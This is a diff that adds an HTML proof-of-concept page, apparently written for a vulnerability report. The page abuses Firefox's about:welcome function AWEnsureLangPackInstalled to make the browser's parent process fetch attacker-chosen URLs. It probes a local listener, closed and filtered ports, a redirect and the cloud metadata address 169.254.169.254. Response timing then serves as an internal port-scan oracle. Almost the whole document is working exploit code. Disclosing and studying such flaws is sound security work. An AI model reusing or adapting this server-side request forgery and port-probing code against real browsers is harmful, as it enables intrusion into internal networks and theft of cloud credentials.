@@ -1,0 +1,61 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Firefox LangPack Parent SSRF + Port Oracle PoC — sn0x</title>
+<style>
+ body{background:#0d1117;color:#c9d1d9;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+      margin:0;padding:28px;line-height:1.5}
+ h1{color:#58a6ff;font-size:18px;border-bottom:1px solid #30363d;padding-bottom:10px}
+ .ok{color:#3fb950;font-weight:700}.bad{color:#f85149;font-weight:700}.warn{color:#d29922}
+ pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;
+     overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+ button{background:#238636;color:#fff;border:0;border-radius:6px;padding:9px 16px;
+        font:inherit;cursor:pointer}button:hover{background:#2ea043}
+ table{border-collapse:collapse;margin-top:8px}td,th{border:1px solid #30363d;padding:4px 10px;text-align:left}
+</style>
+<h1>Firefox LangPack Parent SSRF + Port Oracle PoC — sn0x</h1>
+<p>Paste/run inside <code>about:welcome</code> page scope. Calls the exported
+<code>AWEnsureLangPackInstalled</code> with attacker-chosen URLs. The parent process performs the
+fetch; watch <code>listener.py</code>.</p>
+<p><button id="go">Launch PoC</button></p>
+<pre id="out">idle</pre>
+<script>
+const out = document.getElementById("out");
+const LISTENER = "http://127.0.0.1:8798";
+const TARGETS = [
+  ["loopback OPEN",        LISTENER + "/LANGPACK-SSRF"],
+  ["loopback CLOSED :9",   "http://127.0.0.1:9/CLOSED-PORT"],
+  ["filtered 10.255.255.1","http://10.255.255.1:80/FILTERED"],
+  ["redirect /redir",      LISTENER + "/redir"],
+  ["metadata IP",          "http://169.254.169.254/latest/meta-data/"]
+];
+function line(s){ out.textContent += "\n" + s; }
+document.getElementById("go").onclick = async () => {
+  out.textContent = "STATUS: SENDING...";
+  const w = window.wrappedJSObject || window;
+  if (typeof w.AWEnsureLangPackInstalled !== "function") {
+    out.textContent = "FAILED — AWEnsureLangPackInstalled not present; is this about:welcome?";
+    return;
+  }
+  line("target                     elapsed   settle");
+  line("-------------------------- --------- --------");
+  for (const [label, url] of TARGETS) {
+    const arg = (w.JSON || JSON).parse(JSON.stringify({
+      langPack: { url, hash: "sha256:" + "0".repeat(64), target_locale: "zz-ZZ" },
+      requestSystemLocales: ["en-US"], langPackDisplayName: "probe"
+    }));
+    const t0 = Date.now();
+    let settle;
+    try {
+      settle = await w.AWEnsureLangPackInstalled(arg, (w.JSON || JSON).parse("{}"))
+        .then(() => "resolved", () => "rejected");
+    } catch (e) { settle = "threw"; }
+    const ms = Date.now() - t0;
+    line(label.padEnd(26) + (ms + "ms").padEnd(10) + settle);
+  }
+  line("");
+  line("STATUS: CONFIRMED — check listener.py for the captured parent-process requests.");
+  line("Open ~2-10ms, closed ~2ms w/ no hit, filtered ~21000ms => internal port oracle.");
+  line("NOTE: every row 'rejects' — that is the post-download signature failure,");
+  line("      NOT a pre-fetch block. The request already left the browser.");
+};
+</script>
